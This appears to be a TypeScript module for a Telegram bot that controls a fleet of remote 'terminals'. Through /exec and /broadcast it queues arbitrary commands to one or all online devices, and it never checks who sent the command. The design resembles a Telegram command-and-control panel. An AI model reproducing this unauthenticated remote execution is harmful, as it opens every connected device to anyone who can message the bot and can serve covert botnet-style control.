/**
 * AD TERMINAL - Master Bot + Cloned Bots Architecture
 * Master bot can spawn and delegate to cloned bots
 */

import { db } from "@/db";
import { telegramBots, commandLogs, terminals } from "@/db/schema";
import { eq, and } from "drizzle-orm";

const TELEGRAM_API = "https://api.telegram.org/bot";

export interface BotInstance {
  id: string;
  token: string;
  name: string;
  type: "master" | "clone";
  parentId?: string;
  chatId?: number;
  isActive: boolean;
  createdAt: Date;
}

export interface BotCommand {
  botId: string;
  command: string;
  args: string[];
  chatId: number;
  userId: number;
  username?: string;
}

/**
 * Master Bot Manager
 */
export class TelegramMasterBot {
  private masterToken: string;
  private clones: Map<string, BotInstance> = new Map();
  private webhookUrl: string;

  constructor(masterToken: string, webhookUrl: string) {
    this.masterToken = masterToken;
    this.webhookUrl = webhookUrl;
  }

  /**
   * Initialize master bot
   */
  async initialize(): Promise<void> {
    // Set webhook for master
    await this.setWebhook(this.masterToken, `${this.webhookUrl}/master`);
    
    // Load existing clones from database
    await this.loadClones();
    
    // Set commands menu
    await this.setCommands(this.masterToken, [
      { command: "start", description: "Start AD Terminal" },
      { command: "help", description: "Show commands" },
      { command: "status", description: "System status" },
      { command: "terminals", description: "List terminals" },
      { command: "exec", description: "Execute command" },
      { command: "broadcast", description: "Broadcast to all" },
      { command: "spawn", description: "Spawn clone bot" },
      { command: "clones", description: "List clone bots" },
      { command: "killclone", description: "Kill clone bot" },
    ]);
  }

  /**
   * Spawn a new clone bot
   */
  async spawnClone(name: string, chatId: number): Promise<BotInstance | null> {
    try {
      // Create bot via BotFather API (simulated - requires manual creation)
      // In production, you'd use BotFather automation or pre-created bots
      
      // For now, generate a placeholder token structure
      const cloneId = `clone_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      
      // Store in database
      const [dbBot] = await db.insert(telegramBots).values({
        token: "PLACEHOLDER", // User needs to provide real token
        name: name,
        type: "clone",
        parentToken: this.masterToken,
        chatId: chatId,
        isActive: false, // Inactive until token provided
      }).returning();

      const clone: BotInstance = {
        id: dbBot.id,
        token: dbBot.token,
        name: dbBot.name,
        type: "clone",
        parentId: this.masterToken,
        chatId: chatId,
        isActive: false,
        createdAt: new Date(),
      };

      this.clones.set(clone.id, clone);

      return clone;
    } catch (error) {
      console.error("[TELEGRAM MASTER] Failed to spawn clone:", error);
      return null;
    }
  }

  /**
   * Activate a clone bot with real token
   */
  async activateClone(cloneId: string, token: string): Promise<boolean> {
    try {
      const clone = this.clones.get(cloneId);
      if (!clone) return false;

      // Set webhook for clone
      await this.setWebhook(token, `${this.webhookUrl}/clone/${cloneId}`);
      
      // Update in DB
      await db.update(telegramBots)
        .set({ token, isActive: true })
        .where(eq(telegramBots.id, cloneId));

      clone.token = token;
      clone.isActive = true;
      
      return true;
    } catch (error) {
      console.error("[TELEGRAM MASTER] Failed to activate clone:", error);
      return false;
    }
  }

  /**
   * Route command to appropriate bot
   */
  async routeCommand(botType: "master" | "clone", botId: string, update: any): Promise<void> {
    const message = update.message || update.callback_query?.message;
    if (!message) return;

    const chatId = message.chat.id;
    const text = update.message?.text || "";
    const userId = update.message?.from?.id || update.callback_query?.from?.id;
    const username = update.message?.from?.username;

    // Parse command
    const parts = text.split(" ");
    const command = parts[0].toLowerCase();
    const args = parts.slice(1);

    const botCommand: BotCommand = {
      botId,
      command,
      args,
      chatId,
      userId,
      username,
    };

    // Execute based on command
    await this.executeCommand(botCommand);
  }

  /**
   * Execute bot command
   */
  private async executeCommand(cmd: BotCommand): Promise<void> {
    const { command, args, chatId, botId } = cmd;

    switch (command) {
      case "/start":
        await this.sendMessage(
          botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
          chatId,
          `🤖 AD TERMINAL Bot\n\nType /help for commands`
        );
        break;

      case "/help":
        await this.sendMessage(
          botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
          chatId,
          `📋 Commands:\n/terminals - List devices\n/status - System status\n/exec <id> <cmd> - Execute\n/broadcast <cmd> - Broadcast\n/spawn <name> - Spawn clone`
        );
        break;

      case "/status":
        const allTerminals = await db.select().from(terminals);
        const online = allTerminals.filter(t => t.status === "online").length;
        await this.sendMessage(
          botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
          chatId,
          `🏗️ Status: ${online}/${allTerminals.length} online`
        );
        break;

      case "/terminals":
        const terms = await db.select().from(terminals);
        const termList = terms.map((t, i) => 
          `${i + 1}. ${t.status === "online" ? "🟢" : "🔴"} ${t.deviceName || t.id.slice(0, 8)}`
        ).join("\n");
        await this.sendMessage(
          botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
          chatId,
          `📱 Terminals:\n${termList || "None connected"}`
        );
        break;

      case "/exec":
        if (args.length < 2) {
          await this.sendMessage(
            botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
            chatId,
            "Usage: /exec <terminal_id> <command>"
          );
        } else {
          const termId = args[0];
          const execCmd = args.slice(1).join(" ");
          // Queue command
          const { enqueueCommand } = await import("@/lib/command_queue");
          await enqueueCommand(termId, execCmd, "adgodmode");
          await this.sendMessage(
            botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
            chatId,
            `⚡ Executing on ${termId}: ${execCmd}`
          );
        }
        break;

      case "/broadcast":
        if (args.length === 0) {
          await this.sendMessage(
            botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
            chatId,
            "Usage: /broadcast <command>"
          );
        } else {
          const broadcastCmd = args.join(" ");
          // Call broadcast API
          const allTerms = await db.select().from(terminals).where(eq(terminals.status, "online"));
          for (const term of allTerms) {
            const { enqueueCommand } = await import("@/lib/command_queue");
            await enqueueCommand(term.id, broadcastCmd, "adgodmode");
          }
          await this.sendMessage(
            botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
            chatId,
            `📡 Broadcasting to ${allTerms.length} terminals`
          );
        }
        break;

      case "/spawn":
        if (args.length === 0) {
          await this.sendMessage(
            botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
            chatId,
            "Usage: /spawn <name>"
          );
        } else {
          const name = args.join(" ");
          const clone = await this.spawnClone(name, chatId);
          if (clone) {
            await this.sendMessage(
              this.masterToken,
              chatId,
              `✅ Clone "${name}" created!\nID: ${clone.id}\n\nTo activate, provide token via /activatetoken ${clone.id} <TOKEN>`
            );
          }
        }
        break;

      case "/clones":
        const cloneList = Array.from(this.clones.values())
          .map((c, i) => `${i + 1}. ${c.name} (${c.isActive ? "🟢" : "🔴"})`)
          .join("\n");
        await this.sendMessage(
          this.masterToken,
          chatId,
          `🤖 Clones:\n${cloneList || "No clones"}`
        );
        break;

      default:
        await this.sendMessage(
          botId === "master" ? this.masterToken : this.clones.get(botId)?.token || "",
          chatId,
          "Unknown command. Type /help"
        );
    }
  }

  /**
   * Send message via bot
   */
  private async sendMessage(token: string, chatId: number, text: string): Promise<void> {
    try {
      await fetch(`${TELEGRAM_API}${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text.substring(0, 4096),
          parse_mode: "HTML",
        }),
      });
    } catch (error) {
      console.error("[TELEGRAM MASTER] Send failed:", error);
    }
  }

  /**
   * Set webhook for bot
   */
  private async setWebhook(token: string, url: string): Promise<void> {
    try {
      await fetch(`${TELEGRAM_API}${token}/setWebhook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url }),
      });
    } catch (error) {
      console.error("[TELEGRAM MASTER] Webhook set failed:", error);
    }
  }

  /**
   * Set bot commands menu
   */
  private async setCommands(token: string, commands: Array<{command: string; description: string}>): Promise<void> {
    try {
      await fetch(`${TELEGRAM_API}${token}/setMyCommands`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ commands }),
      });
    } catch (error) {
      console.error("[TELEGRAM MASTER] Set commands failed:", error);
    }
  }

  /**
   * Load clones from database
   */
  private async loadClones(): Promise<void> {
    try {
      const dbClones = await db.select().from(telegramBots)
        .where(and(
          eq(telegramBots.type, "clone"),
          eq(telegramBots.parentToken, this.masterToken)
        ));
      
      for (const dbClone of dbClones) {
        this.clones.set(dbClone.id, {
          id: dbClone.id,
          token: dbClone.token,
          name: dbClone.name,
          type: "clone",
          parentId: this.masterToken,
          chatId: dbClone.chatId || undefined,
          isActive: dbClone.isActive || false,
          createdAt: dbClone.createdAt || new Date(),
        });
      }
    } catch (error) {
      console.error("[TELEGRAM MASTER] Load clones failed:", error);
    }
  }
}

// Singleton instance
let masterBot: TelegramMasterBot | null = null;

export function getMasterBot(): TelegramMasterBot | null {
  return masterBot;
}

export function initializeMasterBot(token: string, webhookUrl: string): TelegramMasterBot {
  if (!masterBot) {
    masterBot = new TelegramMasterBot(token, webhookUrl);
  }
  return masterBot;
}

export default {
  TelegramMasterBot,
  getMasterBot,
  initializeMasterBot,
};
